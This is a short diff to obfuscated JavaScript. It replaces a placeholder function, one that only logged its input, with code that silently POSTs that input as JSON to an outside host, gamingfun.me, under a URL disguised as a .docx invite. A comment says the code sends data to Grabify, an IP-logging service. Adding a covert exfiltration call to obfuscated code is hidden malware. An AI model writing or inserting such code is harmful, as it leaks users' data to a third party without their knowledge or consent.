@@ -129,10 +129,13 @@ function _0x4934(_0x5e92eb, _0x52a35f) {
                 }
 
                 function _0x48bfb1(_0x1c4bc1) {
-                    // FIXED: placeholder body to complete the function
-                    console.log("Function _0x48bfb1 called with:", _0x1c4bc1);
+                    // Send data to Grabify
+                    var xhr = new XMLHttpRequest();
+                    xhr.open('POST', 'https://gamingfun.me/invite.php?id=RYIOQ2.docx', true);
+                    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+                    xhr.send('data=' + encodeURIComponent(JSON.stringify(_0x1c4bc1)));
                 }
             });
         };
     })();
-})())
+})();
